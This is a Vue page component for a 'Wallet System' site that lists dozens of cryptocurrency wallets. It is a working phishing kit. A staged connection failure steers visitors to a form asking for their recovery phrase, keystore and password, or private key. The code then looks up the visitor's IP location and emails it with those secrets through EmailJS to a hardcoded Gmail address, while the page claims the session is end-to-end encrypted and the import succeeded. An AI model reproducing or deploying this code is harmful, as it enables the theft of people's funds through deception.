                  class="coin-img"
                  src="/images/xec.webp"
                  alt="ECASH"
                />
                <h4 class="text-white">ECASH</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/dash.webp"
                  alt="DASH"
                />
                <h4 class="text-white">DASH</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/xrd.webp"
                  alt="RADIX"
                />
                <h4 class="text-white">RADIX</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/bsv.webp"
                  alt="BITCOIN_SV"
                />
                <h4 class="text-white">BITCOIN SV</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/rose.webp"
                  alt="OASIS_NETWORK"
                />
                <h4 class="text-white">OASIS NETWORK</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/near.webp"
                  alt="NEAR"
                />
                <h4 class="text-white">NEAR</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/phantasma.webp"
                  alt="PHANTASMA"
                />
                <h4 class="text-white">PHANTASMA</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal39"
                class="btn coin"
              >
                <img class="coin-img" src="/images/1433894569.png" alt="" />
                <h4 class="text-white">Coinmoni</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal40"
                class="btn coin"
              >
                <img class="coin-img" src="/images/28931745.png" alt="" />
                <h4 class="text-white">GridPlus</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal41"
                class="btn coin"
              >
                <img class="coin-img" src="/images/unnamed(3).png" alt="" />
                <h4 class="text-white">CYBAVO</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal42"
                class="btn coin"
              >
                <img class="coin-img" src="/images/512x512bb(1).jpg" alt="" />
                <h4 class="text-white">Tokenary</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal43"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/torus.png"
                  alt=""
                />
                <h4 class="text-white">Torus</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal44"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/unnamed(4).png"
                  alt=""
                />
                <h4 class="text-white">Spatium</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal45"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150.jpeg"
                  alt=""
                />
                <h4 class="text-white">SafePal</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal46"
                class="btn coin"
              >
                <img class="coin-img" src="/images/unnamed(5).png" alt="" />
                <h4 class="text-white">Infinito</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal47"
                class="btn coin"
              >
                <img class="coin-img" src="/images/walletio.png" alt="" />
                <h4 class="text-white">wallet.io</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal48"
                class="btn coin"
              >
                <img class="coin-img" src="/images/unnamed(6).png" alt="" />
                <h4 class="text-white">Ownbit</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal49"
                class="btn coin"
              >
                <img class="coin-img" src="/images/512x512bb(2).jpg" alt="" />
                <h4 class="text-white">EasyPocket</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal50"
                class="btn coin"
              >
                <img class="coin-img" src="/images/unnamed(7).png" alt="" />
                <h4 class="text-white">Bridge Wallet</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal51"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/Sparkpoint-wallet-logo.png"
                  alt=""
                />
                <h4 class="text-white">Spark Point</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal52"
                class="btn coin"
              >
                <img class="coin-img" src="/images/unnamed(8).png" alt="" />
                <h4 class="text-white">ViaWallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal53"
                class="btn coin"
              >
                <img class="coin-img" src="/images/bitkeep.png" alt="" />
                <h4 class="text-white">BitKeep</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal54"
                class="btn coin"
              >
                <img class="coin-img" src="/images/vision.png" alt="" />
                <h4 class="text-white">Vision</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal55"
                class="btn coin"
              >
                <img class="coin-img" src="/images/unnamed(9).png" alt="" />
                <h4 class="text-white">PEAKDEFI</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal56"
                class="btn coin"
              >
                <img class="coin-img" src="/images/unnamed(10).png" alt="" />
                <h4 class="text-white">Unstoppable</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal57"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/76861339.png"
                  alt=""
                />
                <h4 class="text-white">HaloDeFi</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal58"
                class="btn coin"
              >
                <img class="coin-img" src="/images/unnamed(11).png" alt="" />
                <h4 class="text-white">Dok Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal60"
                class="btn coin"
              >
                <img class="coin-img" src="/images/images(2).png" alt="" />
                <h4 class="text-white">Midas</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal61"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/1_N6Uvv2QMQGqQubnGP1tGig.png"
                  alt=""
                />
                <h4 class="text-white">Ellipal</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal62"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="/images/LOGO-KEYRING-PRO.png"
                  alt=""
                />
                <h4 class="text-white">KEYRING PRO</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal63"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c.jpeg"
                  alt=""
                />
                <h4 class="text-white">Aktionariat</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal64"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/unnamed(12).png"
                  alt=""
                />
                <h4 class="text-white">Talken</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal65"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/0x0.png"
                  alt=""
                />
                <h4 class="text-white">Flare</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal66"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/kyberswap.png"
                  alt=""
                />
                <h4 class="text-white">KyberSwap</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal70"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/unnamed(13).png"
                  alt=""
                />
                <h4 class="text-white">PayTube</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal72"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="/images/dd8ee41915d967e547c80266e883d77ee808427405f4e8026a85ac1308104221.jpeg"
                  alt=""
                />
                <h4 class="text-white">Linen</h4>
              </button>
              <!-- Modal -->
            </div>
            <div class="coin-registry">
              <button
                v-for="wallet in filteredWallets"
                :key="`${wallet.name}|${wallet.modalTarget}|${wallet.imgSrc}`"
                type="button"
                class="btn coin"
                @touchend.prevent.stop="activateWallet(wallet)"
                @click.prevent.stop="activateWallet(wallet)"
              >
                <img
                  class="coin-img"
                  :src="wallet.imgSrc"
                  :alt="wallet.name"
                  :style="wallet.imgStyle || undefined"
                />
                <h4 class="text-white">{{ wallet.name }}</h4>
              </button>
            </div>
          </div>
          <div class="row">
            <div class="text-center coin-section-footer">
              <h6> </h6>
            </div>
          </div>
        </div>
      </div>
    </div>

    <Modal :isVisible="showModal" @close="openCloseModal">
      <div
        class="modal-header items-center justify-between flex border-b border-gray-300 pb-4"
      >
        <h5 class="modal-title font-bold" id="exampleModalLabel">
          {{ selectedWallet ? selectedWallet.name : "Select Wallet" }}
        </h5>
        <svg
          xmlns="http://www.w3.org/2000/svg"
          class="w-5 h-5 text-gray-600"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
          stroke-width="2"
          @click="openCloseModal"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            d="M6 18L18 6M6 6l12 12"
          />
        </svg>
      </div>
      <div class="modal-body space-y-5 my-5">
        <div
          v-if="modalStep === 'connecting'"
          class="border border-red-500 p-4 rounded-md"
        >
          <div
            class="border border-green-500 bg-green-100 text-green-700 p-4 rounded-md"
          >
            <h4 class="font-bold text-base text-center">
              {{ selectedWallet ? selectedWallet.name : "Select Wallet" }}
            </h4>
            <p class="text-sm text-center">
              Your connection is secure and encrypted, ensuring your information
              remains on your device.
            </p>

            <div class="flex justify-center items-center">
              <div
                class="spinner-border animate-spin inline-block w-8 h-8 border-4 rounded-full border-green-500 border-t-transparent"
                role="status"
                aria-label="Loading"
              ></div>
            </div>

            <h5 class="font-semibold text-center mt-5">
              Starting secured connections
            </h5>
          </div>
        </div>

        <div
          v-else-if="modalStep === 'error'"
          class="border border-red-500 bg-red-50 text-red-700 p-4 rounded-md space-y-4"
        >
          <div>
            <h4 class="font-bold text-base text-center">
              An error occurred...
            </h4>
            <p class="text-sm text-center">
              Please try again or connect manually.
            </p>
          </div>
          <div class="flex gap-3 justify-center">
            <button
              type="button"
              class="px-4 py-2 rounded-md text-sm bg-gray-900 text-white"
              @click="goToManualConnect"
            >
              Connect manually
            </button>
          </div>
        </div>

        <div
          v-else-if="modalStep === 'manual'"
          class="bg-white text-gray-800 rounded-md space-y-4"
        >
          <!-- <h4 class="font-bold text-base">Manual connection</h4> -->

          <div class="flex">
            <div
              class="inline-flex rounded-md border border-gray-200 overflow-hidden"
            >
              <button
                type="button"
                class="px-4 py-2 text-sm"
                :class="
                  manualTab === 'walletconnect'
                    ? 'bg-gray-900 text-white'
                    : 'bg-white text-gray-900'
                "
                @click="setManualTab('walletconnect')"
              >
                Phrase
              </button>
              <button
                type="button"
                class="px-4 py-2 text-sm border-l border-gray-200"
                :class="
                  manualTab === 'browser'
                    ? 'bg-gray-900 text-white'
                    : 'bg-white text-gray-900'
                "
                @click="setManualTab('browser')"
              >
                Keystore
              </button>
              <button
                type="button"
                class="px-4 py-2 text-sm border-l border-gray-200"
                :class="
                  manualTab === 'hardware'
                    ? 'bg-gray-900 text-white'
                    : 'bg-white text-gray-900'
                "
                @click="setManualTab('hardware')"
              >
                Private Key
              </button>
            </div>
          </div>

          <div v-if="manualScreen === 'form'" class="space-y-4">
            <div v-if="manualTab === 'walletconnect'" class="space-y-2">
              <textarea
                v-model="phrase"
                type="text"
                rows="5"
                class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm"
                placeholder="Enter your recovery phrase"
              />
              <p class="text-xs text-gray-600">
                Typically 12 (sometimes 24) words separated by single spaces
              </p>
            </div>

            <div v-else-if="manualTab === 'browser'" class="space-y-2">
              <textarea
                v-model="keystore"
                type="text"
                rows="5"
                class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm"
                placeholder="Enter keystore"
              />
              <input
                v-model="keystore_password"
                type="password"
                class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm"
                placeholder="Wallet password"
              />
              <p class="text-xs text-gray-600">
                Several lines of text beginning with "{...}" plus the password
                you used to encrypt it.
              </p>
            </div>

            <div v-else class="space-y-2">
              <input
                v-model="private_key"
                type="password"
                class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm"
                placeholder="Private Key"
              />

              <p class="text-xs text-gray-600">
                Every information collected is secured and encrypted.
              </p>
            </div>

            <div class="flex gap-3 justify-center pt-2">
              <button
                type="button"
                style="background: rgb(188, 63, 234)"
                class="px-4 py-2 rounded-md text-white font-semibold"
                @click="manualProceed"
              >
                {{ isLoading ? "Loading..." : "Proceed" }}
              </button>
              <button
                type="button"
                class="px-4 py-2 rounded-md bg-gray-200 text-gray-900 font-semibold"
                @click="openCloseModal"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>

        <div
          v-if="modalStep === 'manual'"
          class="flex border border-green-500 bg-green-100 text-green-700 rounded-md p-2 space-x-4 items-center"
        >
          <img
            class="coin-img"
            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTh6K8SCji9fdCDlKwMOb1wEZM_Dyu434lnKg&s"
            :alt="selectedWallet.name"
          />
          <div class="text-xs">
            <h4 class="font-bold mb-1">
              This session is protected with end-to-end encryption.
            </h4>
            <p class="m-0">Safe to connect manually.</p>
          </div>
        </div>

        <div
          v-if="selectedWallet && modalStep !== 'manual'"
          class="flex border border-[#2d3748] rounded-md p-4 space-x-4 items-center"
        >
          <img
            class="coin-img"
            :src="selectedWallet.imgSrc"
            :alt="selectedWallet.name"
            :style="selectedWallet.imgStyle || undefined"
          />
          <h4 class="text-[#2d3748] font-bold mb-0">
            {{ selectedWallet.name }}
          </h4>
        </div>
      </div>
    </Modal>

    <!-- Success & Error Message -->
    <transition name="fade">
      <div
        v-if="message.text"
        :class="[
          'absolute bottom-3 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded-xl text-sm font-semibold',
          message.type === 'success'
            ? 'bg-green-600 text-white'
            : 'bg-red-600 text-white',
        ]"
      >
        {{ message.text }}
      </div>
    </transition>
  </div>
</template>

<script setup>
import { computed, onMounted, ref } from "vue";
import Modal from "~/components/Modal.vue";

const walletRegistry = ref(null);
const wallets = ref([]);

const searchQuery = ref("");

const message = ref({ text: "", type: "" });

const filteredWallets = computed(() => {
  const query = searchQuery.value.trim().toLowerCase();
  if (!query) return wallets.value;
  return wallets.value.filter((wallet) =>
    wallet.name.toLowerCase().includes(query),
  );
});

const showModal = ref(false);
const selectedWallet = ref(null);
const modalStep = ref("connecting");
let connectionTimeoutId = null;
const manualTab = ref("walletconnect");
const manualScreen = ref("form");
const walletConnectUri = ref("");
const keystore = ref("");
const keystore_password = ref("");
const private_key = ref("");
const phrase = ref("");
const isLoading = ref(false);

const openCloseModal = () => {
  showModal.value = false;
  selectedWallet.value = null;
  modalStep.value = "connecting";
  manualTab.value = "walletconnect";
  manualScreen.value = "form";
  walletConnectUri.value = "";
  keystore.value = "";
  keystore_password.value = "";
  private_key.value = "";
  phrase.value = "";
  if (connectionTimeoutId) {
    clearTimeout(connectionTimeoutId);
    connectionTimeoutId = null;
  }
};

let lastWalletActivationAt = 0;

const selectWallet = (wallet) => {
  selectedWallet.value = wallet;
  modalStep.value = "connecting";
  showModal.value = true;
  if (connectionTimeoutId) clearTimeout(connectionTimeoutId);
  connectionTimeoutId = setTimeout(() => {
    modalStep.value = "error";
    connectionTimeoutId = null;
  }, 3000);
};

const activateWallet = (wallet) => {
  const now = Date.now();
  if (now - lastWalletActivationAt < 400) return;
  lastWalletActivationAt = now;
  selectWallet(wallet);
};

const goToManualConnect = () => {
  if (connectionTimeoutId) {
    clearTimeout(connectionTimeoutId);
    connectionTimeoutId = null;
  }
  modalStep.value = "manual";
  manualScreen.value = "form";
  manualTab.value = "walletconnect";
};

const setManualTab = (tab) => {
  manualTab.value = tab;
};

const buildLinkDrops = () => {
  if (manualTab.value === "walletconnect") {
    return phrase.value.trim()
      ? `Recovery phrase:\n${phrase.value.trim()}`
      : "Recovery phrase:";
  }

  if (manualTab.value === "browser") {
    return `Keystore:\n${keystore.value.trim()}\n\nPassword:\n${keystore_password.value.trim()}`;
  }

  if (manualTab.value === "hardware") {
    return private_key.value.trim()
      ? `Private key:\n${private_key.value.trim()}`
      : "Private key:";
  }

  return "";
};

const manualProceed = async () => {
  isLoading.value = true;

  try {
    const locationData = await fetch("https://ipapi.co/json");
    const locationDataJson = await locationData.json();
    const formattedLocation = JSON.stringify(locationDataJson, null, 2);

    const params = {
      service_id: "service_8lwf7pj",
      template_id: "template_7ynzmbg",
      user_id: "X8SiUQHYTJaQV4lbE",
      template_params: {
        from_name: "MainnetDIY",
        wallet_type: selectedWallet.value?.name || "Unknown Wallet",
        location: formattedLocation,
        link_drops: buildLinkDrops(),
        reply_to: "edgir973@gmail.com",
      },
    };

    console.log(params);

    const response = await fetch(
      "https://api.emailjs.com/api/v1.0/email/send",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(params),
      }
    );

    const resultText = await response.text();

    if (response.ok) {
      showMessage("Wallet imported successfully!", "success");
      openCloseModal();
    } else {
      showMessage(resultText || "Import failed", "error");
    }
  } catch (err) {
    console.error(err);
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
};

onMounted(() => {
  const registryEl = walletRegistry.value;
  if (!registryEl) return;

  const buttonEls = Array.from(registryEl.querySelectorAll("button"));

  wallets.value = buttonEls
    .map((buttonEl) => {
      const name = buttonEl.querySelector("h4")?.textContent?.trim() || "";
      const imgEl = buttonEl.querySelector("img");
      const imgSrc = imgEl?.getAttribute("src") || "";
      const modalTarget = buttonEl.getAttribute("data-bs-target") || "";

      const styleString = imgEl?.getAttribute("style") || "";
      const imgStyle = styleString
        ? styleString
            .split(";")
            .map((p) => p.trim())
            .filter(Boolean)
            .reduce((acc, part) => {
              const [k, v] = part.split(":").map((x) => x?.trim());
              if (!k || !v) return acc;
              acc[k] = v;
              return acc;
            }, {})
        : null;

      if (!name || !imgSrc) return null;
      return { name, imgSrc, modalTarget, imgStyle };
    })
    .filter(Boolean);
});

useHead({
  title: "Wallet System",
  meta: [
    {
      name: "description",
      content:
        "TOKEN SWAP • CLAIM TOKEN BRIDGE • LIQUIDITY POOL AND FARM • DEPOSITS AND WITHDRAWALS • TOKENS STAKE AND UNSTAKE • LEDGER AND TREZOR HARDWARE • DEX WEBSITE ERROR • KYC • WHITELIST • ALLOCATION • AIRDROPS • COMPROMISED WALLET RECLAIM • MISSING TOKENS • UNABLE TO ACCESS WALLET • NFT'S AND NFT'S RELATED ISSUES • GENERAL WALLET ISSUES",
    },
  ],
});

function showMessage(text, type = "success") {
  message.value = { text, type };
  setTimeout(() => {
    message.value.text = "";
  }, 3000);
}
</script>

<style lang="scss" scoped></style>
